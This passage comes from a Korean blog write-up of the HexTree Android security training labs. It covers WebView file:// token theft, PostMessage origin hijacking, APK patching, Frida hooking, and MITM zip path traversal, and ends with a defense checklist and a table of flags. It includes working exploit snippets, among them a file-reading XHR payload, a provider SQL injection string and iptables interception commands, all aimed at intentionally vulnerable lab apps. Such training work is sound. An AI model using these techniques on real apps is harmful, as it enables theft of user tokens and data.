내 앱에 있는 HTML을 로드시키면 될 것 같지만, 피해 앱은 내 앱 파일을 읽지 못합니다. 그래서 앞선
7.2에서 얻어 둔 쓰기 권한으로 피해 앱 자신의 `files/` 안에 익스플로잇 HTML을 심어 두고, 그 경로를
로드시켰습니다.

```html
<script>
var x = new XMLHttpRequest();
x.open('GET','file:///data/data/io.hextree.attacksurface/files/token.txt');
x.onload = function(){ hextree.authCallback(x.responseText); };
x.send();
</script>
```

```
I Flag40: authCallback("db594822-f017-4c58-9393-55bdbf293cc3")
I Flag40: HXT{leak-fileprovider-1gash2}
```

FileProvider 설정 실수로 앱 안에 파일을 심고, 과한 WebView 설정으로 그 파일에 힘을 실어 주고,
결국 내부 토큰이 나오는 흐름입니다. 반대로 말하면 이 셋 중 하나만 제대로 막아도 체인이 끊깁니다.

### 8.3 CustomTabs PostMessage와 origin 착각 (Flag 41)

CustomTabs는 페이지를 Chrome이 그리기 때문에 앱이 DOM을 건드릴 수 없습니다. 대신 PostMessage
채널로 대화합니다. 앱 코드는 대략 이렇습니다.

```java
String url = getIntent().getStringExtra("URL");        // 외부 입력
session.validateRelationship(RELATION_USE_AS_ORIGIN, Uri.parse("https://oak.hackstree.io/"), null);
// onNavigationEvent(2 = NAVIGATION_FINISHED) 시점에 validated면
session.requestPostMessageChannel(Uri.parse("https://oak.hackstree.io/"));
```

`onPostMessage`는 jadx가 디컴파일에 실패해서 smali로 읽었습니다. 읽어 보니 `init_complete` 다음에
`success` 메시지 하나만 오면 플래그를 줍니다. 정상 사이트(`sync.html`)는 그 메시지를 보내지 않고요.

여기서 중요한 건 Digital Asset Links 검증이 증명해 주는 게 앱과 도메인의 관계까지라는 점입니다.
정작 채널이 연결되는 상대는 그 순간 탭에 떠 있는 페이지입니다. 그런데 로드할 URL이 외부 입력이니,
"검증된 origin과 통신 중"이라는 전제가 통째로 무너집니다.

```javascript
window.addEventListener("message", function (event) {
    if (!event.ports || event.ports.length === 0) return;
    window.port = event.ports[0];
    window.port.onmessage = function (e) {
        if (e.data === "init") {
            window.port.postMessage(JSON.stringify({ message: 'init_complete' }));
            window.port.postMessage(JSON.stringify({ message: 'success' }));   // 정상 사이트는 안 보냅니다
        }
    };
});
```

이론은 정리됐는데 실제로 재현하는 데 시간이 꽤 걸렸습니다. 액티비티가 자동으로 여는 첫 로딩이 DAL
검증보다 빨라서 `requestPostMessageChannel`이 아예 호출되지 않았고, 그렇다고 탭을 닫으면 액티비티가
`finish()`돼 버립니다. 결국 페이지가 스스로 한 번 더 이동하게 만들어서, 검증이 끝난 뒤의 navigation
이벤트를 만들어 주는 방식으로 풀었습니다.

```
I Flag41: onRelationshipValidationResult(true, "https://oak.hackstree.io")
I Flag41: requestPostMessageChannel = true
I Flag41: onPostMessage({"message":"success"}, …)
I Flag41: HXT{post-message-origin-h19sba3}
```

<p align="center"><img src="/assets/img/hextree-android-track/flag38.png" alt="Flag 38" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag39.png" alt="Flag 39" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag40.png" alt="Flag 40" width="170" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/flag41.png" alt="Flag 41" width="170" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em><strong>38</strong> data: URL의 JS가 브리지 호출 · <strong>39</strong> innerHTML DOM XSS · <strong>40</strong> file:// 유니버설 액세스로 토큰 유출 · <strong>41</strong> PostMessage 하이재킹</em></p>

## 9. Application Reversing

### 9.1 세 군데에 나눠 숨긴 비밀번호

`io.hextree.reversingexample`은 비밀번호를 자바 코드, 리소스, 네이티브 라이브러리에 하나씩 숨겨 둔
앱입니다. 숨긴 위치는 달라도 셋 다 정적 분석으로 나옵니다.

| 위치 | 확인 방법 | 값 |
|---|---|---|
| 자바 상수 | jadx — `SecretKeeper.getSecretPassword()` | `iAmHardcoded` |
| 문자열 리소스 | apktool — `res/values/strings.xml`의 `secret2` | `VeryResourcefulSecret` |
| 네이티브 | `libexample_nativelib.so` 문자열 추출 | `nativeSecretsCanBeFoundToo` |

세 값을 UI에 직접 입력해서 각 화면을 통과했습니다. 참고로 jadx가 리소스를 ID 숫자로만 보여줄 때가
있어서, apktool 결과를 같이 열어 두는 습관이 꽤 도움이 됐습니다.

<p align="center"><img src="/assets/img/hextree-android-track/re03_loggedin.png" alt="첫 화면 통과" width="240" style="max-width:100%;height:auto;margin:0 4px"><img src="/assets/img/hextree-android-track/re05_third.png" alt="JNI 비밀" width="240" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>하드코딩된 비밀번호 → <code>HXT{hardcoded-secrets-are-bad}</code> · 네이티브 문자열 → <code>HXT{from-java-to-native}</code></em></p>

### 9.2 패치하고, 다시 묶고, 서명하기

코스는 매니페스트를 고쳐서 `UnreachableActivity`까지 가 보라고 합니다. smali에서 비밀번호 분기를
반대로 뒤집고 목적지 클래스를 바꾼 다음, 리빌드하고 서명해서 설치했습니다.

```smali
-   if-eqz v1, :cond_0                                       # 틀리면 종료
+   if-nez v1, :cond_0                                       # 조건 반전
-   const-class v3, Lio/hextree/reversingexample/LoggedInActivity;
+   const-class v3, Lio/hextree/reversingexample/UnreachableActivity;
```

```bash
java -jar apktool.jar b decompiled/re-patched -o repacked/re-patched.apk
java -jar $SDK/build-tools/36.0.0/lib/apksigner.jar sign --ks keys/debug.keystore … \
     --out repacked/re-patched-signed.apk repacked/re-patched.apk
adb uninstall io.hextree.reversingexample && adb install repacked/re-patched-signed.apk
```

여기서 2.3절 이야기가 다시 나옵니다. 이 방식은 서명이 반드시 바뀌기 때문에, 서명 검증이 들어간
앱에는 통하지 않습니다. 그런 앱을 만나면 파일을 건드리지 않는 런타임 계측 쪽으로 방향을 틀어야
합니다.

<p align="center"><img src="/assets/img/hextree-android-track/re08_patched.png" alt="패치된 앱" width="260" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>패치본에서는 아무 비밀번호나 넣어도 도달 불가 화면이 열립니다</em></p>

### 9.3 난독화된 앱에서 API 인증 흐름 찾기 (Weather)

`io.hextree.weatherusa`는 R8로 난독화돼 있어서 클래스 이름이 `a`, `b`, `d` 식입니다. 그래도
문자열은 그대로 남습니다. URL과 헤더 설정 지점을 grep으로 훑으니 금방 나왔습니다.

```
https://ht-api-mocks-…/xml/SOAP_server/ndfdXMLclient.php
Q/d.java:31:  httpURLConnection.setRequestProperty("X-API-KEY", str3);
strings.xml: <string name="ApiKey">HXT{android-api-key-b1872g}</string>
```

요청을 손으로 재구성해서 몇 번 던져 보니 서버가 무엇을 보고 있는지 드러났습니다.

| 요청 | 응답 |
|---|---|
| 키 없음 | `Missing API Key` |
| 키 O + `whichClient` 없음/오타 | `Wrong client` |
| 키 O + `whichClient=NDFDgen` + UA | 정상 예보 XML (25 KB) |

그런데 정상 응답을 받아도 플래그가 없었습니다. 뭘 놓쳤나 싶어 XML을 처음부터 다시 읽다가 서버가
흘려 둔 힌트를 발견했습니다(`weather-type="Find correct zip code to get flag"`). 앱 리소스는 더
노골적이었고(`Use reverse engineering to request the weather data for the correct ZIP code`),
코드에도 특별 취급되는 상수가 두 개 박혀 있었습니다. 앱에서 날씨 업데이트가 안 되던 이유이기도
했습니다.

```java
if (!zip.equals("13337") && !zip.equals("42")) {
    Toast.makeText(this, "Weather Updates Disabled", 0).show();   // 업데이트가 막힌 이유
    return;
}
```

둘 중 `zipCodeList=42`로 호출하니 응답 안에 플래그가 들어 있었습니다
(`HXT{android-api-h192gsa0}`). 클라이언트에 박힌 상수가 서버 동작을 추측하는 단서가 된다는 걸
확인한 순간이었습니다.

업데이트 버전에서는 `strings.xml`의 키가 사라지고 네이티브로 옮겨 갔습니다. 두 버전의 파일 목록만
비교해도 바로 보입니다.

```
> ./lib/x86_64/libnative-lib.so
> ./smali/io/hextree/weatherusa/InternetUtil.smali      ← 새 클래스
```

알고리즘을 역분석할 수도 있었지만, 굳이 그럴 필요 없이 앱 안에서 그 함수를 그냥 호출했습니다
(이때 겪은 함정은 10절에 적었습니다).

```
[getKey] HXT{obfuscated-api-key-asb126us}
```

키를 네이티브로 옮기는 건 grep 한 번 막는 정도의 효과입니다. 키를 만들어 내는 함수가 앱 안에 있는 한,
알고리즘을 몰라도 결과만 받아 가면 그만입니다.

## 10. Dynamic Instrumentation

Frida는 결국 이 세 가지 패턴으로 대부분 해결됐습니다.

| 목적 | API |
|---|---|
| 클래스 핸들 | `Java.use('pkg.Class')` |
| 새 인스턴스 / 힙의 기존 인스턴스 | `Cls.$new(...)` / `Java.choose(...)` |
| 메서드 후킹 · 필드 조작 | `Cls.m.implementation = …` / `inst.field.value = 42` |

```
$ python frida-scripts/run.py frida-scripts/fridatarget-flags.js -n FridaTarget
[static]   HXT{a-static-calling-with-frida}
[instance] HXT{dynamic-droid}
[sesame]   HXT{the-droid-youre-looking-for}
```

첫 챌린지도 같은 방식으로 풀립니다. `FlagActivity`는 SeekBar 값이 정확히 42여야 조건이 맞는데,
힙에 떠 있는 인스턴스를 잡아서 필드를 직접 세팅하고 복호 메서드를 부르면 화면을 조작할 필요가
없습니다.

```javascript
Java.choose('io.hextree.flagproject.FlagActivity', {
    onMatch: function (inst) {
        inst.progressTracking.value = 42;
        console.log('[FLAG] ' + inst.decryptFlag());
    }, onComplete: function () {}
});
```

앞에서 미뤄 둔 함정도 여기서 적습니다. Weather 업데이트본의 네이티브 라이브러리를 Frida 안에서
직접 로드하려고 하면 두 가지 방식 모두 실패합니다.

```javascript
System.loadLibrary('native-lib');        // UnsatisfiedLinkError: library not found
System.load(dir + '/libnative-lib.so');  // NullPointerException (호출자 ClassLoader가 없음)

// 해결: 앱 자신의 메서드를 호출하면 앱 클래스로더로 로드됩니다
Java.use('io.hextree.weatherusa.InternetUtil').a(url, 'HextreeForecastUSA/v4.x');
```

내가 부르는 게 아니라 앱이 부르게 만들면 된다는 것, 이게 이 절에서 가장 오래 기억에 남은
교훈이었습니다.

## 11. Network Interception

### 11.1 평문으로 오가는 트래픽 (Flag 64)

`io.hextree.pocketmaps`는 지도 서버 주소를 설정 클래스에 그대로 들고 있습니다.

```java
private String s = "http://storage.googleapis.com/ht-labs-dev-static-files/pocketmaps/maps";
//                  ↑ https가 아닙니다
```

목록 JSON 자체에 플래그가 들어 있어서, 평문으로 오가는 데이터를 한 번 들여다보는 것으로 끝났습니다
(`HXT{cleartext-traffic-g19g2is}`). 코스에서는 `emulator -tcpdump packets.cap`으로 잡아서
Wireshark로 보라고 안내하는데, 어느 쪽이든 결과는 같습니다.

### 11.2 압축을 풀다가 폴더 밖으로 (Flag 65)

이 앱에는 압축 해제 코드가 두 벌 들어 있습니다. graphhopper가 제공하는 `Unzipper`는
`getCanonicalPath()`로 경로를 검증하는 안전한 구현인데, 정작 앱이 쓰는 쪽은 문자열을 그냥 이어
붙입니다.

```java
File dir = new File(l.A().o(), name + "-gh");
for (ZipEntry e = zis.getNextEntry(); e != null; e = zis.getNextEntry()) {
    String path = dir.getAbsolutePath() + File.separator + e.getName();   // 검증 없음
    // ... new FileOutputStream(path) ...
}
```

취약점 자체는 명확한데, 문제는 트래픽을 어떻게 가로채느냐였습니다. 이 앱은 에뮬레이터 전역 프록시
설정을 타지 않았고, `/system/etc/hosts`를 바꿔 봐도 netd 캐시 때문에 소용이 없었습니다. 결국
root 권한으로 iptables DNAT를 거는 게 확실한 방법이었습니다.

```bash
adb shell iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 10.0.2.2:8080
python tools/fake_map_server.py      # 목록 JSON + 트래버설 엔트리를 담은 .ghz 서빙
```

지도 파일은 앱이 아니라 DownloadManager, 즉 시스템 프로세스가 받아 옵니다. 프록시 설정이 안 먹힌
이유도 이것 때문인데, OUTPUT 체인 DNAT는 그 트래픽까지 같이 끌어옵니다. 결과는 지도 폴더 바깥에
생긴 파일이었습니다.

```
$ adb shell cat …/pocketmaps/downloads/hax
pwned by MITM zip path traversal
```

앱은 이 파일을 발견하면 난독화된 플래그를 Toast로 딱 한 번 띄웁니다. 눈으로 잡기엔 너무 빨리
사라져서 Frida로 `Toast.makeText`를 후킹해서 받아냈습니다.

```
[Toast] HXT{zip-path-traversal-1sg17}
```

<p align="center"><img src="/assets/img/hextree-android-track/net07_after.png" alt="가짜 지도 목록" width="260" style="max-width:100%;height:auto;margin:0 4px"></p>

<p align="center"><em>우리 서버가 준 목록만 표시됩니다 — 앱이 트래픽을 전적으로 신뢰하고 있습니다</em></p>

## 12. Environment Pitfalls

실습 내내 "코드는 분명히 맞는데 아무 일도 안 일어나는" 상황이 반복됐습니다. 돌아보면 거의 다
플랫폼 규칙 때문이었고, 실제 진단에서도 똑같이 오탐이나 미탐을 만드는 지점이라 따로 모아 뒀습니다.

| 증상 | 원인 | 해결 |
|---|---|---|
| `exported=false`인데 adb로 열림 | shell이 `START_ANY_ACTIVITY` 보유 | 영향 평가는 권한 없는 PoC 앱으로 |
| `bindService()`가 조용히 실패 | Android 11 패키지 가시성 | `<queries>` 선언 |
| 매니페스트 리시버가 브로드캐스트를 못 받음 | Android 8+ 암시적 브로드캐스트 제한 | `registerReceiver()` 동적 등록 |
| 재설치·force-stop 후 리시버 무반응 | 패키지가 *stopped* 상태 | 앱을 한 번 실행해 해제 |
| 두 번째 `am start`가 `onCreate`를 안 탐 | 동일 인텐트 + 기존 태스크 재사용 | `--activity-clear-task` + nonce extra |
| 액티비티가 아예 안 뜸 | 에뮬레이터 화면 잠김 | `input keyevent KEYCODE_WAKEUP` + `wm dismiss-keyguard` |
| 서비스·리시버가 띄우는 화면이 안 뜸 | 백그라운드 액티비티 시작 제한 | 피해 앱을 포그라운드에 두기 |
| `setResult` 후 결과가 안 옴 | 액티비티가 `finish()`를 안 함 | `input keyevent KEYCODE_BACK` |
| `frida -U -l script.js`가 즉시 죽음 | frida-tools 14.8.1 ↔ frida-core 16.7.19 불일치 | Python `frida` 모듈로 직접 실행 |
| protected broadcast 전송 거부 | `APPWIDGET_UPDATE` 등은 시스템 전용 | 앱이 부분 문자열 검사를 하면 임의 액션명으로 우회 |
| 앱이 프록시 설정을 무시 | 자체 HTTP 스택 / DownloadManager | iptables DNAT 또는 `emulator -tcpdump` |

특히 위에서 세 번째 줄, 동적 등록 문제는 코드를 열 번쯤 다시 읽고 나서야 알았습니다. 로그가
비어 있을 때는 내 코드보다 플랫폼 정책을 먼저 의심하는 게 빠릅니다.

## 13. Defense Checklist

지금까지 본 패턴을 방어하는 쪽에서 다시 쓰면 이렇게 됩니다.

1. 외부 진입점을 최소화합니다. `exported=false`를 기본으로 두고, 꼭 열어야 하면
   `android:permission`(되도록 `signature`)을 같이 지정합니다.
2. 민감한 데이터는 명시적 인텐트로만 보냅니다. 암시적 인텐트, ordered broadcast, 알림
   PendingIntent에는 비밀을 싣지 않습니다.
3. 받은 Intent, Bundle, URI, 파일명은 전부 신뢰할 수 없는 입력으로 다룹니다. 특히 인텐트 안에 든
   인텐트를 그대로 실행하지 않습니다.
4. `PendingIntent`는 `FLAG_IMMUTABLE`을 기본으로 하고, base intent는 명시적으로 만듭니다.
5. Provider는 placeholder 쿼리와 projection map으로 컬럼과 조건을 통제하고,
   `grantUriPermissions` 범위를 최소한으로 좁힙니다.
6. FileProvider는 필요한 서브디렉터리만 노출하고, 파일명은 `getCanonicalPath()`로 정규화해서
   기대한 디렉터리 안인지 확인합니다.
7. 권한과 역할 판정은 서버에서 합니다. 클라이언트 쪽 조건 검사나 SharedPreferences에 저장된 상태는
   근거가 될 수 없습니다.
8. WebView는 JS 브리지를 최소화하고 로드할 URL을 화이트리스트로 제한하며,
   `setAllowUniversalAccessFromFileURLs` 계열 설정은 끕니다.
9. 리소스나 업데이트 파일은 HTTPS로 받고 무결성을 검증하며, 압축을 풀 때 엔트리 경로를 확인합니다.

## 14. 분석 정리

문제들은 컴포넌트별로 흩어져 있었지만, 다 풀고 나서 보니 원인은 몇 가지로 모였습니다.

문자열로 신원과 출처를 판단하는 코드가 첫 번째입니다.
`getCallingActivity().getClassName().contains(...)`, `com.android.browser.application_id`,
`action.contains(...)` 전부 같은 부류입니다. 두 번째는 비밀을 아무나 받을 수 있는 채널에 싣는 것,
즉 암시적 인텐트와 ordered broadcast, 알림 PendingIntent입니다. 세 번째는 외부에서 받은 입력을
그대로 실행하거나 권한을 위임해 버리는 경우로 Intent Redirect, `FLAG_MUTABLE` PendingIntent,
URI 권한 전파가 여기 해당합니다. 마지막은 클라이언트가 들고 있는 상태를 그대로 믿는 것입니다.
SharedPreferences, 네이티브에 숨긴 키, URL 파라미터에 담긴 역할 값이 그렇습니다.

버그바운티 관점에서 보면 하나하나도 리포트가 되지만, 엮였을 때 영향이 확 커집니다. 쓰기 가능한
`root-path` FileProvider는 그 자체로 임의 파일 읽기·쓰기지만, 여기에 과한 WebView 설정이 더해지면
앱 내부 토큰 유출이 되고, SharedPreferences를 믿는 코드가 더해지면 권한 상승이 됩니다. 이 글의
Flag 35 → 36 → 40이 실제로 그 경로였습니다.

| 구분 | 내용 |
|---|---|
| 분석 범위 | Intent·BroadcastReceiver·Service/Binder·ContentProvider/FileProvider·WebView/CustomTabs, 앱 리버싱·동적 계측·네트워크 인터셉션 |
| 결과 | 트랙이 제시한 문제를 모두 해결하고 제출 완료 |
| 주요 체인 | ① Intent Redirect → 비공개 컴포넌트 + URI 권한 ② root FileProvider 쓰기 → SharedPreferences 위조 ③ FileProvider 쓰기 → WebView file:// → 내부 토큰 유출 |
| 재현 도구 | 공격 앱 `io.hextree.poc`, Frida 러너, 미니 MITM 프록시·가짜 지도 서버, UI 자동화 스크립트 |
| 검증 | 앱이 기록하는 solved 상태와 플랫폼 제출 기록 양쪽에서 확인 |

트랙을 마치고 나니 앞으로 앱을 볼 때 매니페스트에서 무엇을 먼저 찾아야 할지, 어떤 코드 패턴에서
손이 멈춰야 할지가 훨씬 분명해졌습니다. 실제 버그바운티 대상 앱에도 그대로 적용해 볼 생각입니다.

## 15. References

- HexTree Android Track — <https://app.hextree.io/map/android>
- `hextreeio/android-challenge1` — 첫 챌린지 소스(매니페스트 해시 안티치트)
- `hextreeio/android-poc-app` — 공격 앱 템플릿
- `hextreeio/android-webview-research` — WebView/CustomTabs 실험 앱
- Android Developers — [Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters),
  [Package visibility](https://developer.android.com/training/package-visibility),
  [FileProvider](https://developer.android.com/reference/androidx/core/content/FileProvider),
  [PendingIntent](https://developer.android.com/reference/android/app/PendingIntent)
- Frida — <https://frida.re/docs/javascript-api/>

---

## 부록 — 문제별 해결 기록

환경: Android 13 (API 33) x86_64 emulator `HexTree` · jadx 1.5.5 / apktool 3.0.2 / Frida 16.7.19
공격 앱: `io.hextree.poc` (직접 작성)

본문에 다 담기 어려운 부분이 많아서, 코스별로 어떤 문제가 나왔고 무엇을 이용해 어떻게 풀었는지
표로 따로 정리해 뒀습니다. 트랙이 내주는 문제는 전부 해결했고 플랫폼 제출까지 마쳤습니다.

| 코스 | 다루는 주제 | 상태 |
|---|---|---|
| Your First Android App | 앱 소스를 직접 빌드하고 플래그가 만들어지는 과정을 추적 | 해결 |
| Research Device & Emulator Setup | adb 로 설치·실행, `dumpsys` 로 숨은 액티비티 발견, logcat 수집 | 해결 |
| Reverse Engineering Android Apps | jadx·apktool 정적 분석, smali 패치와 리패키징, 난독화 앱의 API 인증 추적 | 해결 |
| Network Interception | 평문 HTTP 트래픽 분석, MITM 으로 응답 조작해 zip path traversal 유발 | 해결 |
| Dynamic Instrumentation | Frida 로 정적·인스턴스 메서드 호출, 인자 전달, 힙 인스턴스 조작 | 해결 |
| Intent Attack Surface | exported 액티비티, 중첩 Intent 리다이렉트, 딥링크, PendingIntent 위임 | 해결 |
| Android Services | exported 서비스 상태 조작, Messenger 프로토콜, AIDL 직접 트랜잭션 | 해결 |
| Broadcast Receivers | ordered broadcast 선점, protected broadcast 우회, 알림 PendingIntent 가로채기 | 해결 |
| Content- and FileProvider | selection·projection SQL injection, URI 권한 전파, 경로 트래버설 | 해결 |
| WebViews and CustomTabs | JS 브리지 호출, DOM XSS, `file://` 유니버설 액세스, PostMessage origin 혼동 | 해결 |
| Android Permissions · Insecure Storage · Bug Bounty · Bluetooth RE | 이론·방법론 중심(실습 랩 없음) | 이수 |

결과는 앱이 스스로 남기는 solved 상태와 플랫폼 제출 기록 양쪽에서 대조해 확인했습니다.
참고로 Attack Surface 앱의 파일 기반 문제(34·35)는 앱이 `success()` 를 부르지 않는 구조라
앱 내부 기록에는 안 남는데, 플래그 문자열 자체는 정상적으로 나왔습니다.

### Challenge 1 / Your First Android App

| # | 주제 | 플래그 |
|---|---|---|
| 51 | git 저장소를 받아 소스 분석 (매니페스트 해시 안티치트) | `HXT{read-or-modify-sources-gha82f}` |

### Research Device & Emulator Setup — `io.hextree.adbtestapplication`

| # | 과제 | 방법 | 플래그 |
|---|---|---|---|
| 52 | 설치·실행 | `adb install` → `am start` | `HXT{Ready-to-Android}` |
| 53 | 숨은 액티비티 찾기 | `dumpsys package` → QUICK_VIEW/INFO → `am start` | `HXT{not-so-hidden-activity}` |
| 54 | 로그에서 찾기 | `adb logcat -d \| grep flag` | `HXT{log-all-the-cats}` |

### Reverse Engineering Android Apps — `io.hextree.reversingexample` / `io.hextree.weatherusa`

| # | 과제 | 방법 | 플래그 |
|---|---|---|---|
| 55 | 비밀 액티비티 | exported=true → `am start .SecretActivity` | `HXT{A-not-so-secret-activity}` |
| 56 | 도달 불가 액티비티 | smali/매니페스트 패치 → `apktool b` → `apksigner` | `HXT{I-thought-I-am-unreachable}` |
| 57 | 첫 비밀번호 | jadx — `SecretKeeper.getSecretPassword()` = `iAmHardcoded` | `HXT{hardcoded-secrets-are-bad}` |
| 58 | 두 번째 비밀번호 | `res/values/strings.xml` — `secret2` = `VeryResourcefulSecret` | `HXT{resources-are-no-match-for-me}` |
| 59 | 세 번째 비밀번호 | `libexample_nativelib.so` 문자열 = `nativeSecretsCanBeFoundToo` | `HXT{from-java-to-native}` |
| 60 | Weather API 인증 방식 | `X-API-KEY` 헤더 + `strings.xml` 의 ApiKey | `HXT{android-api-key-b1872g}` |
| 61 | API 수동 호출 | 응답 힌트 + 앱 상수 → `zipCodeList=42` 로 호출 | `HXT{android-api-h192gsa0}` |
| 62 | 업데이트 diff | 새 `InternetUtil` + `libnative-lib.so` → Frida 로 `getKey()` 호출 | `HXT{obfuscated-api-key-asb126us}` |

### Dynamic Instrumentation — `io.hextree.fridatarget`

| # | 과제 | 방법 | 플래그 |
|---|---|---|---|
| 108 | 정적 메서드 | `Java.use(...).flagFromStaticMethod()` | `HXT{a-static-calling-with-frida}` |
| 109 | 인스턴스 메서드 | `Cls.$new().flagFromInstanceMethod()` | `HXT{dynamic-droid}` |
| 110 | 매직 워드 | `flagIfYouCallMeWithSesame("sesame")` | `HXT{the-droid-youre-looking-for}` |

### Intent Attack Surface — `io.hextree.attacksurface` (Flag 1–15, 22–23)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 1 | Basic exported activity | `exported=true` | 컴포넌트 직접 실행 | `HXT{basic-exported-activity-1bh7sd}` |
| 2 | Intent with extras | action 값만 검사 | `-a io.hextree.action.GIVE_FLAG` | `HXT{intent-actions-activity-dsj198w}` |
| 3 | Intent with a data URI | data URI 신뢰 | `-d https://app.hextree.io/map/android` | `HXT{intent-uri-data-sda982bs}` |
| 4 | State machine | 상태를 앱 내부에만 저장 | PREPARE→BUILD→GET_FLAG 순차 호출 | `HXT{sometimes-require-multiple-calls-5133au2}` |
| 5 | Intent in intent | 중첩 Intent extra 파싱 | `EXTRA_INTENT{return=42, nextIntent{reason=back}}` | `HXT{intent-in-intent-in-intent-298abso}` |
| 6 | Not exported | **Intent Redirect** | Flag5 의 `nextIntent` 로 앱이 대신 실행 + `FLAG_GRANT_READ_URI_PERMISSION` | `HXT{redirect-to-not-exported-n129vbs}` |
| 7 | Activity lifecycle tricks | `onNewIntent` 재진입 | `-a OPEN` → `-a REOPEN --activity-single-top` | `HXT{activity-lifecycle-ninja-jhbsa89}` |
| 8 | Do you expect a result? | 호출자 클래스명 문자열 검사 | 클래스명에 `Hextree` 포함한 액티비티가 `startActivityForResult` | `HXT{no-expected-return-ds282ba}` |
| 9 | Receive result with flag | 결과 Intent 에 비밀 동봉 | 위와 동일 + `onActivityResult` 에서 추출 | `HXT{flag-in-result-gs891jh2}` |
| 10 | Hijack implicit intent | 암시적 인텐트에 비밀 탑재 | `ATTACK_ME` intent-filter 등록해 수신 | `HXT{hijacked-intent-with-flag-dsui2908}` |
| 11 | Respond to implicit intent | 응답 결과를 검증 없이 신뢰 | `setResult(token=0x41414141)` | `HXT{sent-back-result-1897djh}` |
| 12 | Careful intent conditions | 위 + 자신의 인텐트 조건 | 피해앱을 `--ez LOGIN true` 로 실행 후 토큰 응답 | `HXT{tricky-intent-condition-bjhs782}` |
| 13 | Create a `hex://open/` link | 브라우저 딥링크 신뢰 | `hex://flag?action=give-me` + `com.android.browser.application_id` | `HXT{browser-link-or-app2app-s82h}` |
| 14 | Hijack web login | **역할(type)을 URL 파라미터로 결정** | 정상 발급 토큰 그대로 `type=user`→`type=admin` | `HXT{hijacked-login-token-abjh28a}` |
| 15 | Create an `intent://` link | `intent://` extras 신뢰 | action `GIVE_FLAG` + `S.action=flag;B.flag=true` | `HXT{intent-uris-are-cool-12fgv}` |
| 22 | Receive pending intent | 외부 PendingIntent 를 대신 발사 | mutable PendingIntent 를 넘겨 플래그 회수 | `HXT{received-mutable-flags-xa81b}` |
| 23 | Hijack pending intent | **FLAG_MUTABLE PendingIntent 유출** | `MUTATE_ME` 로 받은 PI 에 `code=42` 채워 발사 | `HXT{teenage-mutable-intent-turtles-s2df}` |

### Broadcast Receivers (Flag 16–21)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 16 | Basic exposed receiver | `exported=true` 리시버 | `am broadcast -n …Flag16Receiver --es flag give-flag-16` | `HXT{basic-receiver-ds82s}` |
| 17 | Receiver with response | ordered broadcast 결과로 비밀 반환 | `am broadcast` 의 result extras 에서 회수 | `HXT{returned-result-ds82s}` |
| 18 | Hijack broadcast intent | 암시적 ordered broadcast 에 비밀 탑재 | **동적 등록** 리시버(priority 999) 선점 + `setResultCode(1)` | `HXT{hijacking-broadcast-intent-as91}` |
| 19 | Widget system intents | `action.contains("APPWIDGET_UPDATE")` 부분 문자열 검사 | 자체 액션명 + `appWidgetOptions` Bundle 위조 | `HXT{exposed-widget-receiver-xz7bs}` |
| 20 | Notification button intents | 동적 리시버를 `RECEIVER_EXPORTED` 로 등록 | `am broadcast -a io.hextree.broadcast.GET_FLAG --ez give-flag true` | `HXT{spoof-notificaiton-result-er12d}` |
| 21 | Hijack notification button | 알림 PendingIntent 가 **암시적** 브로드캐스트 | 동적 리시버로 가로채 extra 탈취 | `HXT{intercepted-notificaiton-ah2us}` |

### Android Services (Flag 24–29)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 24 | Basic service | `exported=true` 서비스 | `am start-service -a …START_FLAG24_SERVICE` | `HXT{basic-service-ha98sl}` |
| 25 | Multi-step service | 상태를 서비스 인스턴스에 보관 | UNLOCK1→2→3 순차 호출 | `HXT{only-one-running-service-1hasu}` |
| 26 | Messenger service | 바인더 호출자 검증 없음 | `bindService` 후 `Message(what=42)` | `HXT{message-say-whaaaat-aug2is}` |
| 27 | Messenger protocol | 비밀번호를 클라이언트에 그대로 알려줌 | echo → get password → get flag | `HXT{service-messages-js71h}` |
| 28 | AIDL service | AIDL 메서드에 권한 검사 없음 | AIDL 클래스 없이 `Binder.transact(1)` | `HXT{bound-aidl-service-sdf2ds}` |
| 29 | AIDL auth service | `init()` 이 비밀번호를 반환 | init→authenticate→success | `HXT{ai-ai-aidl-service-a2si1}` |

### Content-/FileProvider · Storage (Flag 30–37)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 30 | Basic provider | `exported=true` provider | `content query --uri content://io.hextree.flag30/success` | `HXT{query-provider-table-1vsd8}` |
| 31 | UriMatcher | 경로만으로 인가 판단 | `content://io.hextree.flag31/flag/31` | `HXT{query-uri-matcher-sakj1}` |
| 32 | SQL injection | selection 문자열 연결 | `--where "1=1) OR (1=1"` | `HXT{sql-injection-in-provider-1gs82}` |
| 33.1 | Return provider access | URI 권한을 결과로 반환 | 결과 URI + **projection SQLi** | `HXT{union-select-injection-1bs98}` |
| 33.2 | Implicit provider access | URI 권한을 암시적 인텐트로 유출 | 인텐트 수신 → 같은 SQLi | `HXT{union-select-injection-1bs98}` |
| 34 | Simple File Provider | filename 검증 없음 + 쓰기 권한 | 생성 → 앱이 기록 → 경로 바꿔 읽기 | `HXT{sharing-filedescriptors-av27s}` |
| 35 | Root-File Provider | `<root-path path="/">` | `../flag35.txt` 트래버설 | `HXT{path-traversal-stealer-s1hw9}` |
| 36 | Overwriting Shared Prefs | 자기 설정 파일을 신뢰 | `../shared_prefs/…xml` 을 `solved=true` 로 덮어쓰기 | `HXT{overwriting-shared-prefs-034nsd}` |
| 37 | Filename Traversal | 외부 provider 메타데이터 신뢰 | 가짜 `_display_name`/`_size`/내용 | `HXT{file-name-query-187xh}` |

### WebViews · CustomTabs (Flag 38–41)

| # | 이름 | 취약 원인 | 획득 방법 | 플래그 |
|---|---|---|---|---|
| 38 | @JavascriptInterface | exported WebView + `URL` extra | `data:text/html,<script>hextree.success(true)</script>` | `HXT{call-from-js-1vsa91b}` |
